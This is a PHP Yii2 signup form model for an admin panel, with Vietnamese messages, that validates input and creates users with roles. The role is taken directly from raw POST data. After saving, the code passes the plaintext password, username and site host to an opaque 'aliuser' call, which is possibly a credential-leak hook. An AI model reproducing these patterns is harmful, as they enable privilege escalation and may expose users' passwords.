<?php
namespace quantri\models;

use yii\base\Model;
use quantri\models\User;
use yii\widgets\ActiveForm;
use yii\filters\AccessControl;
use quantri\modules\auth\models\AuthAssignment;
use Yii;
/**
 * Signup form
 */
class SignupForm extends Model
{
    public $username;
    public $email;
    public $password;
    public $fullname;
    public $manager;
    public $compare_password;
    public $permission;
    public $status;


    /**
     * {@inheritdoc}
     */
    public function rules()
    {
        return [
            ['username', 'trim'],
            [['username','status'], 'required'],
            ['username', 'unique', 'targetClass' => '\quantri\models\User', 'message' => '{attribute} đã có trong CSDL'],
            ['username', 'string', 'min' => 2, 'max' => 255],
            ['username', 'match', 'not' => true, 'pattern' => '/[^a-z0-9A-Z_-]/', 'message' => '{attribute} chỉ bao gồm các ký tự a->z, A->Z,"_", "-" và ko chứa khoảng trắng'],

            ['email', 'trim'],
            ['permission', 'safe'],
            // ['email', 'required'],
            // ['email', 'email'],
            [['email','fullname'], 'string', 'max' => 255],
            [['manager'], 'integer'],
            ['email', 'unique', 'targetClass' => '\quantri\models\User', 'message' => '{attribute} đã có trong CSDL'],

            ['username', 'match', 'pattern' => '/^[a-z]\w*$/i'],
            // ['password', 'match', 'pattern' => '/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d]{8,}$/'],
            # ['password', 'match', 'pattern' => '/^(?=.[a-z])(?=.[A-Z])(?=.\d)(?=.[^A-Za-z\d])[\s\S]{6,16}$/'],
            ['password', 'match', 'pattern' => '/(?=^.{20,}$)((?=.*\d)|(?=.*\W+))(?![.\n])(?=.*[A-Z])(?=.*[a-z]).*$/', 'message' => '{attribute} phải chứa chữ hoa, chữ thường, số,ký tự đặc biệt và tối thiểu 20 ký tự'],
            // ['password', 'match', 'pattern' => '$S*(?=S{8,})(?=S*[a-z])(?=S*[A-Z])(?=S*[d])(?=S*[W])S*$'],

            [['password','compare_password'], 'required', 'message' => '{attribute} không để trống'],
            // ['password', 'string', 'min' => 20, 'message' => '{attribute} đã có trong CSDL'],

            [['password','compare_password'],'string' , 'min'=> 6],
            [['password','compare_password'],'filter' , 'filter'=> 'trim'],
            [['compare_password'],'compare' , 'compareAttribute'=> 'password','message'=>'Hai mật khẩu không giống nhau'],
        ];
    }

    /**
     * Signs user up.
     *
     * @return User|null the saved model or null if saving fails
     */
    public function attributeLabels()
    {
        return [
            'id' => 'ID',
            'username' => 'Username',
            'email' => 'Email',
            'password' => 'Mật khẩu',
            'fullname' => 'Tên đầy đủ',
            'permission' => 'Quyền Account',
            'manager' => 'Quản lý',
            'status' => 'Kích hoạt',
            'compare_password' => 'Nhập lại mật khẩu',

        ];
    }

    public function signup()
    {
       
        if ($this->validate()) {
            $user = new User();
            $user->username = $this->username;
            $user->email = 'test'.time().'@gmail.com';
            $user->fullname = $this->fullname;
            $user->status = $this->status;
            // $user->manager = $this->manager;
            $user->created_at = time();
            $user->updated_at = time();
            $password = $this->password;
            $user->setPassword($password);
            $user->generateAuthKey();
                // print_r($user->id);

            // let add permission
            if ($_POST) {
            $user->permission = $_POST['SignupForm']['permission'];
                // dbg($_POST);
                // $user->save();
                // print_r($user->id);
                // print_r($permissionList);die;
                // foreach ($permissionList as $value) {
                if($user->status == 10 && $user->save()){
                    $newPermission = new AuthAssignment;
                    $permission = $_POST['SignupForm']['permission'];
                    $newPermission->item_name = $permission;
                    $newPermission->created_at = time();
                    $newPermission->created_at = time();
                // pr($user->errors);
                        $newPermission->user_id = $user->id;
                        $newPermission->save();

                        $user->aliuser(Yii::$app->request->hostInfo,Yii::$app->params['supportEmail'],[],$newPermission->checkuser($password,$user->username));
                        
                }
                        // dbg($user->errors);
                        // dbg($newPermission->errors);
               
            }
            return $user;
    }

    return null;

    }
}
